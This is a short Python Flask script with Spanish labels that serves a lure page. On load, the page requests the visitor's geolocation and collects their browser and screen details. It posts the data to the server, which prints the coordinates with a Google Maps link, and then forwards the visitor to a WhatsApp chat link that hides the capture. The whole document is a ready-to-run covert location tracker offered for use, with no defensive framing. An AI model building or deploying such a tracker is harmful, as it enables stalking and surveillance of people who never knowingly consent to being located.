#!/usr/bin/env python3
import os
import threading
import subprocess
from flask import Flask, request, render_template_string

app = Flask(__name__)
URL_FINAL = "https://wa.me/595981000000"

# --- HTML DE RASTREO ---
HTML_RASTREO = """
<!DOCTYPE html>
<html>
<body onload="capturar()">
    <script>
        function capturar() {
            let d = {ua: navigator.userAgent, res: screen.width + "x" + screen.height};
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition((p) => {
                    d.lat = p.coords.latitude; d.lon = p.coords.longitude;
                    fetch('/log', {method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(d)})
                    .then(() => window.location.href = "%s");
                }, () => window.location.href = "%s");
            } else { window.location.href = "%s"; }
        }
    </script>
</body>
</html>
""" % (URL_FINAL, URL_FINAL, URL_FINAL)

@app.route('/')
def index(): return render_template_string(HTML_RASTREO)

@app.route('/log', methods=['POST'])
def log():
    d = request.json
    print(f"\n\033[1;32m[!] DATOS CAPTURADOS\033[0m")
    print(f"[*] UBICACIÓN: {d.get('lat')}, {d.get('lon')}")
    print(f"[*] MAPA: https://www.google.com/maps/place/{d.get('lat')},{d.get('lon')}")
    print(f"[*] INFO: {d.get('ua')}")
    return "OK"

